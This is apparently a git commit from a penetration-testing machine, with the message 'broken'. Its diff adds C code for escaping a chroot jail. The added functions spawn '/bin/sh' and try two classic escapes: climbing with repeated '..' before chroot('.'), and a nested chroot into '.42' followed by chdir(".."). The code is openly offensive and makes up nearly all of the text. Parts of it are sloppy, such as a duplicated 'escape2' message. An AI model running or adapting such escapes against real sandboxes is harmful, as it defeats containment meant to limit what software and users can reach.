74cb0c46fc5b40899b67e2a2ff47dc448dcdf3b2
root <root@kali-pentest-standard.kali-pentest-standard.local>
2020-02-20 15:31:03 +0100

    broken

--- chroot-break/escape.c
+++ chroot-break/escape.c
@@ -1,4 +1,26 @@
 
+int spawn_sh()
+{
+    execve("/bin/sh", NULL, NULL);
+}
+
+int attack_chroot_escape2()
+{
+    printf("chroot escape2!\n");
+    chdir("../../../../../../..");
+    chroot(".");
+}
+
+int attack_chroot_escape3()
+{
+    printf("chroot escape2!\n");
+    mkdir(".42", 0755);
+    chroot(".42");
+    //fchdir(3); // there is a log file open at fd 3
+    chdir("..");
+    chroot(".");
+}
+
 int main()
 {
      attack_chroot_escape3();
